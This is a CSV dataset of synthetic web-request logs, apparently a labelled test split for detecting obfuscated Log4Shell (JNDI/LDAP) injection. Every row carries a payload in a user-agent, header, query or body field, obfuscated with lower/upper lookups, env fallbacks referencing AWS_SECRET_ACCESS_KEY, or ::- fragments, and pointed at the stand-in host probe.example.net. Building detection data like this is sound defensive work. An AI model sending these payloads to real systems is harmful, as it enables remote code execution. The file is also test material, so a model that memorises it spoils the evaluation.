id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000904,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested},request from user-agent: ${jndi:ldap://probe.example.net/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000905,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://probe.example.net/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000906,2026-05-17,synthetic,GET /search?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:ldap://probe.example.net/nested} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000907,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/nested},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000908,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000909,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000910,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://probe.example.net/nested} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000911,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested},request from user-agent: ${jndi:ldap://probe.example.net/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000912,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://probe.example.net/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000913,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000914,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000915,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://probe.example.net/lower} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000916,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower},request from user-agent: ${jndi:ldap://probe.example.net/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000917,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://probe.example.net/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000918,2026-05-17,synthetic,GET /search?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://probe.example.net/lower} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000919,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/lower},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000920,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000921,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000922,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://probe.example.net/lower} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000923,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower},request from user-agent: ${jndi:ldap://probe.example.net/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000924,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://probe.example.net/lower},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://probe.example.net/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000925,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000926,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000927,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://probe.example.net/upper} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000928,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper},request from user-agent: ${jndi:ldap://probe.example.net/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000929,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://probe.example.net/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000930,2026-05-17,synthetic,GET /search?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://probe.example.net/upper} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000931,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/upper},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000932,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000933,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000934,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://probe.example.net/upper} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000935,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper},request from user-agent: ${jndi:ldap://probe.example.net/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000936,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://probe.example.net/upper},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://probe.example.net/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000937,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000938,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000939,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://probe.example.net/env} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000940,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env},request from user-agent: ${jndi:ldap://probe.example.net/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000941,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://probe.example.net/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000942,2026-05-17,synthetic,GET /search?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:ldap://probe.example.net/env} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,nested_lookup_env_fallback,path,unseen_obfuscation_test,critical
LS-000943,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/env},1,log4shell,nested_lookup_env_fallback,body,unseen_obfuscation_test,critical
LS-000944,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000945,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000946,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://probe.example.net/env} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000947,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env},request from user-agent: ${jndi:ldap://probe.example.net/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000948,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://probe.example.net/env},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://probe.example.net/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000949,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://probe.example.net/frag} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000950,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://probe.example.net/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000951,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://probe.example.net/frag} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://probe.example.net/frag} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000952,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://probe.example.net/frag},request from user-agent: ${jndi:ldap://probe.example.net/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
